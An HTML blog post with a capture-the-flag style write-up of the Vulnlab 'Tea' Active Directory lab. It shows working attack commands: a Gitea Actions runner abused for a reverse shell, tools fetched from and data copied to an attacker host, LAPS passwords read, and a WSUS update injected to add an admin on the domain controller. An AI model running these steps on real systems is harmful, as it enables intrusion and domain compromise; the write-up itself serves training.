<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Tea - Vulnlab | Regex-33's blog</title><meta name="author" content="Youssef Achtatal"><meta name="copyright" content="Youssef Achtatal"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Tea is one of the chains that I still have left to write up, and it involves traversing though an Active Directory environment with two workstations. The first exploit involves CI&#x2F;CD runners in a Gite">
<meta property="og:type" content="article">
<meta property="og:title" content="Tea - Vulnlab">
<meta property="og:url" content="https://regex-33.me/2024/08/26/tea/index.html">
<meta property="og:site_name" content="Regex-33&#39;s blog">
<meta property="og:description" content="Tea is one of the chains that I still have left to write up, and it involves traversing though an Active Directory environment with two workstations. The first exploit involves CI&#x2F;CD runners in a Gite">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://regex-33.me/images/vulnlab/tea-vl/tea_slide.png">
<meta property="article:published_time" content="2024-08-26T15:48:36.000Z">
<meta property="article:modified_time" content="2024-09-12T15:24:24.716Z">
<meta property="article:author" content="Youssef Achtatal">
<meta property="article:tag" content="Windows">
<meta property="article:tag" content="Vulnlab">
<meta property="article:tag" content="Medium">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://regex-33.me/images/vulnlab/tea-vl/tea_slide.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://regex-33.me/2024/08/26/tea/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Tea - Vulnlab',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-12 11:24:24'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/cyber.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a><a href="//"><div class="headline">Articles</div><div class="length-num">8</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/vulnlab/"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/images/cyberpunk-red.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Regex-33's blog"><span class="site-name">Regex-33's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/vulnlab/"><i class="fa-fw fas fa-folder-open"></i><span> VL-Writeups</span></a></div><div class="menus_item"><a class="site-page" href="/categories/research/"><i class="fa-fw fas fa-folder-open"></i><span> Research</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Tea - Vulnlab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-26T15:48:36.000Z" title="Created 2024-08-26 11:48:36">2024-08-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-12T15:24:24.716Z" title="Updated 2024-09-12 11:24:24">2024-09-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/">writeups</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/vulnlab/">vulnlab</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/vulnlab/windows/">windows</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeups/vulnlab/windows/medium/">medium</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Tea - Vulnlab"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Tea is one of the chains that I still have left to write up, and it involves traversing though an Active Directory environment with two workstations. The first exploit involves CI&#x2F;CD runners in a Gitea instance, and the next involves exploiting a WSUS connection to the domain controller.</p>
<h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><p>So let’s start with our usual NMAP scans of the two machines. We have access to <code>10.10.252.213</code> and <code>10.10.252.214</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ sudo nmap 10.10.252.213 &amp;&amp; sudo nmap 10.10.252.214</span><br><span class="line">Nmap scan report for 10.10.252.213</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 988 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">88/tcp   open  kerberos-sec</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">389/tcp  open  ldap</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">464/tcp  open  kpasswd5</span><br><span class="line">593/tcp  open  http-rpc-epmap</span><br><span class="line">636/tcp  open  ldapssl</span><br><span class="line">3268/tcp open  globalcatLDAP</span><br><span class="line">3269/tcp open  globalcatLDAPssl</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br><span class="line"></span><br><span class="line">Nmap scan report for 10.10.252.214</span><br><span class="line">Host is up (0.11s latency).</span><br><span class="line">Not shown: 995 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">3000/tcp open  ppp</span><br><span class="line">3389/tcp open  ms-wbt-server</span><br></pre></td></tr></table></figure>

<p>It seems for the first machine we have a regular domain controller that is not behind a firewall, along with a workstation that seems to be running a few web services.</p>
<p>We can start my grabbing the two computer names of both machines with either CrackMapExec or NetExec.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ nxc smb 10.10.252.213 </span><br><span class="line">SMB         10.10.252.213     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:tea.vl) (signing:True) (SMBv1:False)</span><br><span class="line"></span><br><span class="line">└─$ nxc smb 10.10.252.214</span><br><span class="line">SMB         10.10.252.214     445    SRV              [*] Windows Server 2022 Build 20348 x64 (name:SRV) (domain:tea.vl) (signing:False) (SMBv1:False)</span><br></pre></td></tr></table></figure>

<p>We’ll add these to our <code>/etc/hosts</code> file and continue with our enumeration.</p>
<p>Given that our entrypoint is usually the standalone workstation(before pivoting to the domain controller), we can start by enumerating SMB and the web services on <code>SRV</code>. That being said, I still did a bit of enumeration on the DC so that we didn’t miss anything before attacking the foothold. The below simply just searches for brute-forceable SIDs, access to SMB shares, or LDAP null authentication.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ smbclient -L 10.10.252.213 -N</span><br><span class="line">└─$ impacket-lookupsid -target-ip 10.10.252.213 -domain-sids -no-pass tea.vl/&#x27;daz&#x27;@10.10.252.213 10000</span><br><span class="line">└─$ ldapsearch -x -H ldap://10.10.252.213 -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=tea,DC=vl&quot;</span><br></pre></td></tr></table></figure>

<p>Nothing seemed to come back with a successful result, so we can assume that we’ll need to get access to <code>SRV</code> before pivoting to the domain controller.</p>
<h1 id="SRV-Web-Application-Enumeration"><a href="#SRV-Web-Application-Enumeration" class="headerlink" title="SRV Web Application Enumeration"></a>SRV Web Application Enumeration</h1><p>So with what we have, we can assume that our initial access will be on the <code>SRV</code> workstation. We have two web services (ports 80 and 3000), along with an SMB share that has signing disabled.</p>
<p>Just to check initially, it seems as though the SMB share does not allow for us to access it without valid credentials.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ smbclient -L 10.10.252.214 -N                   </span><br><span class="line">lpcfg_do_global_parameter: WARNING: The &quot;syslog&quot; option is deprecated</span><br><span class="line">session setup failed: NT_STATUS_ACCESS_DENIED</span><br></pre></td></tr></table></figure>

<p>So we’ll start by looking at the web servers. At a first glance, the first web server seems to be a default IIS webserver.</p>
<p><img src="/images/vulnlab/tea-vl/b.png"></p>
<p>As for port 3000, it seems as though a Gitea instance is running.</p>
<p><img src="/images/vulnlab/tea-vl/c.png"></p>
<p>Now at this point we obviously don’t have credentials in order to access some form of private repository that may or may not be exploitable. However as you’ll notice, the web administrator seemed to allow for public registration in the top right of the page.</p>
<p>After giving the web application a bit of fake information for the sign-up process, we’ll successfully be able to login.</p>
<p><img src="/images/vulnlab/tea-vl/d.png"></p>
<p>However you’ll notice that there isn’t much to explore on this Gitea instance. There don’t seem to be any public repositories that we have visibility on and the only other user that has access to this application is the Administrator user at <code>gitea@tea.vl</code>. This normally has never been an actual domain user - however I verified regardless that it wasn’t by querying the domain controller.</p>
<p>While we don’t have the ability to explore any previously created repositories, we do have the ability to create one with the <code>+</code> icon in the top right next to our profile picture.</p>
<p>Filling in some basic information will allow us to successfully create an empty repository.</p>
<p><img src="/images/vulnlab/tea-vl/e.png"></p>
<h1 id="Foothold-with-CI-CD-Runner-Exploitation"><a href="#Foothold-with-CI-CD-Runner-Exploitation" class="headerlink" title="Foothold with CI&#x2F;CD Runner Exploitation"></a>Foothold with CI&#x2F;CD Runner Exploitation</h1><p>Now at this point, there doesn’t seem to be much for us to do. We have access to an empty repository that we’ve made, but is there a way to exploit it?</p>
<p>There is one method that we can exploit, and it involves a configuration that we can manually enable within our repository as a default user. I used a few resources here, to which you can find <a target="_blank" rel="noopener" href="https://docs.gitea.com/usage/actions/quickstart">here</a> and <a target="_blank" rel="noopener" href="https://frichetten.com/blog/abusing-gitlab-runners/">here</a>. Note that I did take a bit of info from <code>GitLab</code> specifically as there seems to be documentation on it.</p>
<p>CI&#x2F;CD Runners are built-in build instance that essentially allows a web developer to build an application from a YAML file in a multi-step deployment process. This is generally consistent amongst all of the Git instances that allows it, such as Gitea and GitLab. At a bare level it will execute tasks based on the configuration file (generally YAML). The interesting part is that they allow us to execute shell commands from the host computer - so long as they are initialized on the instance itself.</p>
<p>For applications like GitLab, this can be a bit trivial if you don’t already have access to the host machine. In the case of Gitea, there is a way to do this if CI&#x2F;CD pipelines are configured to run within the Gitea instance. After doing a bit of research into CI&#x2F;CD shell exec on different Git web applications, it seems that this could fit our scenario.</p>
<p>To start, we’ll first need to enable to repository action configuration so that we can immediately push the repository to be executed on the pipeline. You can find this under <code>Settings</code> within the repository you created.</p>
<p><img src="/images/vulnlab/tea-vl/f.png"></p>
<p>We’ll then need to set up our YAML configuration file to execute our shell command. What’s in the repository doesn’t matter, aside from the config file.</p>
<p>We can create the configuration file from the main page of our repository. The file path we’ll need to fill in is <code>.gitea/workflows/(any name).yaml</code>. We’ll need a basic template, I used the one <a target="_blank" rel="noopener" href="https://github.com/ChristopherHX/gitea-actions-runner/blob/main/.gitea/workflows/build_release.yml">here</a> and edited a few of the tags.</p>
<p><img src="/images/vulnlab/tea-vl/g.png"></p>
<p>I just used a simple PowerShell reverse shell downloaded from <a target="_blank" rel="noopener" href="https://www.revshells.com/">revshells.com</a>. You should be able to use any type of reverse shell, so long as it is runnable through PowerShell. We’ll start up our listener with <code>rlwrap nc -lvnp 9001</code>, and then commit this file to the branch.</p>
<p>If everything was done correctly, you should see a small yellow icon next to the <code>Update .gitea/workflows/daz.yaml</code> title in your repository. This means that the runner is being built.</p>
<p>After about a minute or so, we’ll look back at our reverse shell and see that we successfully gained shell execution as <code>thomas.wallace</code>.</p>
<p><img src="/images/vulnlab/tea-vl/h.png"></p>
<p>The first flag is within <code>thomas.wallace\Desktop</code>, meaning we have completed the first part of this chain.</p>
<h1 id="Domain-Enumeration"><a href="#Domain-Enumeration" class="headerlink" title="Domain Enumeration"></a>Domain Enumeration</h1><p>The next portion was relatively simple - as since we have command execution on the machine we can assume that the next part of privilege escalation will be through credential hunting.</p>
<p>Since we are within a workstation that is domain-joined as what we would assume would be a domain user, we can simply dump the domain using <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound">SharpHound</a> and import all of the ACLs it finds into the <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">Bloodhound GUI</a>. This will allow us to view all of the domain principals that we may have privilege over (allowing us to pivot to other users).</p>
<p>To start, we’ll need to compile the SharpHound C# data collector in Visual Studio. Once we have it compiled, we can move it to the machine to execute.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\temp&gt; curl http://10.8.0.173:9002/SharpHound.exe -O SharpHound.exe</span><br><span class="line">PS C:\temp&gt; .\SharpHound.exe --CollectionMethods All --ZipFileName dump.zip</span><br><span class="line"></span><br><span class="line">2024-08-25T20:42:57.1486891-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound</span><br><span class="line">2024-08-25T20:42:57.7122011-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote</span><br><span class="line">......</span><br><span class="line"> 1 machine sid mappings.</span><br><span class="line"> 2 sid to domain mappings.</span><br><span class="line"> 0 global catalog mappings.</span><br><span class="line">2024-08-25T20:43:47.4178396-07:00|INFORMATION|SharpHound Enumeration Completed at 8:43 PM on 8/25/2024! Happy Graphing!</span><br></pre></td></tr></table></figure>

<p>This should create a compressed archive containing all of the relevant ACLs to the machine. We’ll bring this back to our machine using an SMB server.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ mkdir share</span><br><span class="line">└─$ impacket-smbserver -smb2support smb share/ -username daz -password Password123@</span><br><span class="line"></span><br><span class="line">PS C:\temp&gt; net use \\10.8.0.173\smb /user:daz Password123@</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">PS C:\temp&gt; cp 20240825204346_dump.zip \\10.8.0.173\smb\20240825204346_dump.zip</span><br></pre></td></tr></table></figure>

<p>We’ll then be able to load our archive into the GUI, and see if any ACLs pop out of interest to us.</p>
<p>Unfortunately as of what I had found, there wasn’t anything that stood out to me that we could exploit. Nonetheless this is good to have, as we could need it in the future should we need to do any pivoting.</p>
<h1 id="Reading-LAPS-Passwords"><a href="#Reading-LAPS-Passwords" class="headerlink" title="Reading LAPS Passwords"></a>Reading LAPS Passwords</h1><p>Upon doing a bit more enumeration into files on the filesystem, I found an interesting notice within <code>C:\_install</code>, a hidden directory on the root of the <code>C:</code> drive. There are two files that hint at <code>LAPS</code> being installed on the host system. While this is something that should be visible on the Bloodhound GUI, it seems as though it was not detectable at first glance.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\_install&gt; ls</span><br><span class="line">Directory: C:\_install</span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line">----                 -------------         ------ ----</span><br><span class="line">-a----        12/24/2023   5:37 AM        1118208 LAPS.x64.msi</span><br><span class="line">-a----        12/24/2023   5:37 AM         641378 LAPS_OperationsGuide.docx</span><br><span class="line">-a----        10/22/2023   6:03 AM         833472 PsExec64.exe</span><br><span class="line">-a----        12/24/2023   5:38 AM         535984 PsInfo64.exe</span><br></pre></td></tr></table></figure>

<p>LAPS is the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview">Local Administrator Password Solution</a>, and is essentially a resource that allows Administrator’s to rotate passwords on the local machine so that the password to the Administrative user is not static and easily obtainable. These passwords are contained within memory so that they are accessible at any time should the Administrator require to log in to the workstation where it belongs to.</p>
<p>The interesting part is that in some cases, we’ll have the ability to read this password entry in memory if domain users are not restricted from access that space in memory. We can use the <a target="_blank" rel="noopener" href="https://github.com/leoloobeek/LAPSToolkit">LAPSToolkit</a> to view this.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\temp&gt; Import-Module .\LAPSToolkit.ps1</span><br><span class="line">PS C:\temp&gt; Get-LapsADPassword</span><br><span class="line">PS C:\temp&gt; Get-LapsADPassword -Identity srv -AsPlainText</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ComputerName        : SRV</span><br><span class="line">DistinguishedName   : CN=SRV,OU=Servers,DC=tea,DC=vl</span><br><span class="line">Account             : Administrator</span><br><span class="line">Password            : [...snip...]</span><br><span class="line">PasswordUpdateTime  : 8/25/2024 3:22:23 PM</span><br><span class="line">ExpirationTimestamp : 9/24/2024 3:22:23 PM</span><br><span class="line">Source              : EncryptedPassword</span><br><span class="line">DecryptionStatus    : Success</span><br><span class="line">AuthorizedDecryptor : TEA\Server Administration</span><br></pre></td></tr></table></figure>

<p>Now that we have the Local Administrator’s password, we can use this to gain a new session through RDP.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ xfreerdp /v:10.10.252.214 /u:Administrator /p:[...snip...]</span><br></pre></td></tr></table></figure>

<p><img src="/images/vulnlab/tea-vl/i.png"></p>
<p>Now that we have access to the Administrator, we can read the next flag which is within the Administrator’s <code>Desktop</code> directory.</p>
<h1 id="Domain-Dominance-through-WSUS"><a href="#Domain-Dominance-through-WSUS" class="headerlink" title="Domain Dominance through WSUS"></a>Domain Dominance through WSUS</h1><p>Now that we have command execution as the Administrative user on <code>SRV</code>, we can attempt to see if there are any other ways to exploit the AD instance to escalate to the domain controller.</p>
<p>If you noticed when we were enumerating the filesystem before, there was a directory within the root folder of the <code>C:</code> drive that isn’t usually on default configured workstations. That folder specifically is the <code>WSUS-Updates</code> folder, which can hint to us that WSUS is running on the workstation we control.</p>
<p><img src="/images/vulnlab/tea-vl/j.png"></p>
<p>At a high-level, <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus">WSUS</a> (Windows Server Update Services) is an internal application on Windows that allows a server to distribute Windows updates to other computers within the domain.</p>
<p>The interesting part specifically is can be noted here in the Microsoft documentation link I provided above.</p>
<blockquote>
<p>For system administrators to automate their operations, they need coverage through command-line automation. The main goal is to facilitate WSUS administration by allowing system administrators to automate their day-to-day operations. By exposing core WSUS operations through Windows PowerShell, system administrators can increase productivity, reduce the learning curve for new tools, and reduce errors due to failed expectations resulting from a lack of consistency across similar operations. The Windows PowerShell cmdlets for WSUS operations add flexibility and agility for the system administrator.</p>
</blockquote>
<p>Essentially, this allows us to automate operations by executing PowerShell commands alongside our update distribution on a domain computer. If we are able to distribute updates to the domain controller, we can attach PowerShell commands to the distributed update and just simply compromise the domain with a few commands. Since these WSUS updates are consumed by the Administrator on the client (the DC in this case), we can perform a simple action such as adding a domain admin.</p>
<p>To determine if WSUS is running, we can query the specific service to see if it is installed.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; Get-WindowsFeature -Name UpdateServices, UpdateServices-WidDatabase, UpdateServices-Services, UpdateServices-UI | Where-Object &#123; $_.Installed -eq $true &#125;</span><br></pre></td></tr></table></figure>

<p>We can also query specific domain computers that are added to WSUS as clients (which we would have control over).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; $wsus = Get-WsusServer -Name &quot;127.0.0.1&quot; -Port 8530; $wsus.GetComputerTargets()</span><br><span class="line"></span><br><span class="line">UpdateServer              : Microsoft.UpdateServices.Internal.BaseApi.UpdateServer</span><br><span class="line">Id                        : e0892f42-3c5b-47c7-8b95-9eb045fdb183</span><br><span class="line">FullDomainName            : dc.tea.vl</span><br><span class="line">IPAddress                 : 10.10.252.213</span><br><span class="line">Make                      : Amazon EC2</span><br><span class="line">Model                     : t3a.small</span><br><span class="line">BiosInfo                  : Microsoft.UpdateServices.Administration.BiosInfo</span><br><span class="line">OSInfo                    : Microsoft.UpdateServices.Administration.OSInfo</span><br><span class="line">OSArchitecture            : AMD64</span><br><span class="line">ClientVersion             : 10.0.20348.2031</span><br><span class="line">OSFamily                  : Windows</span><br><span class="line">OSDescription             : Windows Server 2022 Standard</span><br><span class="line">ComputerRole              : Server</span><br><span class="line">LastSyncTime              : 8/26/2024 3:08:04 PM</span><br><span class="line">LastSyncResult            : Succeeded</span><br><span class="line">LastReportedStatusTime    : 8/26/2024 3:08:05 PM</span><br><span class="line">LastReportedInventoryTime : 1/1/0001 12:00:00 AM</span><br><span class="line">RequestedTargetGroupName  :</span><br><span class="line">RequestedTargetGroupNames : &#123;&#125;</span><br><span class="line">ComputerTargetGroupIds    : &#123;b73ca6ed-5727-47f3-84de-015e03f6a88a,</span><br><span class="line">                            a0a08746-4dbe-4a37-9adf-9e7652c0b421&#125;</span><br><span class="line">ParentServerId            : 00000000-0000-0000-0000-000000000000</span><br><span class="line">SyncsFromDownstreamServer : False</span><br></pre></td></tr></table></figure>

<p>We can also double-check that this configuration is in place by visiting the <code>Windows Server Update Services</code> GUI that should be accessible through our RDP session.</p>
<p><img src="/images/vulnlab/tea-vl/k.png"></p>
<p>As you can see, it seems we have confirmed that the DC is configured to receive Windows updates from our current workstation, <code>SRV</code>. This means that we should be able to exploit this functionality and add a local admin through our update distribution.</p>
<p>We can exploit this relatively easily with tools such as <a target="_blank" rel="noopener" href="https://github.com/alex-dengx/WSUSpendu">WSUSpendu</a> and <a target="_blank" rel="noopener" href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a>. These tools can allow us to distribute fake Windows updates and attach our PowerShell commands to them, essentially performing a mock update distribution process. I had more luck with <code>WSUSpendu</code>, so we’ll use that for our scenario.</p>
<p>We’ll also need a copy of PsExec as to avoid any form of endpoint detection or antivirus. You can find PsExec on the <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">SysInternals Suite</a>, or use the one provided under <code>C:\_install</code> on <code>SRV</code>.</p>
<p>In the below example we’ll be adding a new local admin onto the DC that we can use to login through WinRM or RDP.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\WSUSpendu.ps1 -Inject -PayloadFile C:\temp\PsExec64.exe -PayloadArgs &#x27;-accepteula -s -d cmd.exe /c &quot;net user daz Password123@ /add &amp;&amp; net localgroup administrators daz /add&quot;&#x27; -ComputerName dc.tea.vl</span><br></pre></td></tr></table></figure>

<p><code>WSUSpendu</code> performs all of the update configuration that is required on the backend, all that’s left is to wait for the DC to take the update and execute the attached PowerShell command. This took a bit of time with my experience, generally around 5 minutes. In a real environment we’d potentially be able to speed this up by creating a phishing campaign to coerce the Windows workstation to accept the update.</p>
<p>After waiting around five minutes, we can see that our domain admin was added successfully.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">└─$ nxc winrm 10.10.252.213 -u &#x27;daz&#x27; -p &#x27;Password123@&#x27;</span><br><span class="line">WINRM       10.10.252.213   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:tea.vl)</span><br><span class="line">WINRM       10.10.252.213   5985   DC               [+] tea.vl\daz:Password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>

<p>Now that we have WinRM access to the DC, we can simply log in and read the root flag.</p>
<p><img src="/images/vulnlab/tea-vl/l.png"></p>
<p>This means we have successfully compromised this chain!</p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This machine was helpful into doing some research into exploits that I haven’t traditionally seen in a lot of AD environments. WSUS and LAPSv2 especially, as these configurations required a bit of research into actually exploiting them and were not picked up upon on Bloodhound.</p>
